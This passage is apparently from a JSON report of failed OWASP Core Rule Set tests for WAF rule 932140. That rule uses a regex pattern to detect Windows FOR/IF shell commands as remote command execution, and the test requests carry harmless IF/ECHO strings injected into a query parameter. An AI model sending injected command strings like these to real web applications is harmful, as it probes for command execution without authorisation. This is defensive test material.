          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 134,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942180 - Detects basic SQL authentication bypass attempts 1/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 134,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+%22%25var%25%22%3D%3D%22Hello%2C+World%21%22+%28ECHO+found%29",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 135,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942180 - Detects basic SQL authentication bypass attempts 1/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 135,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+%2FI+%22%25var%25%22%3D%3D%22hello%2C+world%21%22+%28+ECHO+found+%29",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 136,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 136,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+%2FI+%22%25var%25%22+EQU+%221%22+ECHO+equality+with+1",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 137,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 137,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+%2FI+%22%25var%25%22+NEQ+%220%22+ECHO+inequality+with+0",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
